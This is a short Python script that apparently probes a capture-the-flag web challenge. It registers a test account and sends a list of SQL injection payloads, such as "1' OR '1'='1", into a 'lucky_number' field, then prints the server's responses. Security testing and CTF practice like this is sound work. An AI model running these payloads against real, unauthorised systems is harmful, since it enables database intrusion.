import requests, sys, re, time
sys.stdout.reconfigure(encoding='utf-8', errors='replace')
sys.stderr.reconfigure(encoding='utf-8', errors='replace')

base = 'https://web-random-cheese.tracebash.xyz'

# Check if lucky_number can be set to manipulate PRNG in non-numeric ways
# Also check if REST API / JSON body works

s = requests.Session()
s.post(f'{base}/register', data={'username':'sqltest','password':'sqltest'})
s.post(f'{base}/login', data={'username':'sqltest','password':'sqltest'})

# Try SQL injection in lucky_number
payloads = [
    "1' OR '1'='1",
    "1 OR 1=1",
    "'-1",
    "1; --",
    "1'--",
]
for p in payloads:
    r = s.post(f'{base}/update_lucky', data={'lucky_number': p})
    if r.status_code != 429:
        print(f'Payload {p!r}: HTTP {r.status_code}, body={r.text[:200]}')
        # Try a spin
        r2 = s.post(f'{base}/spin')
        print(f'  Spin: {r2.text[:200]}')
    else:
        print(f'Payload {p!r}: 429 rate limited')
    time.sleep(1)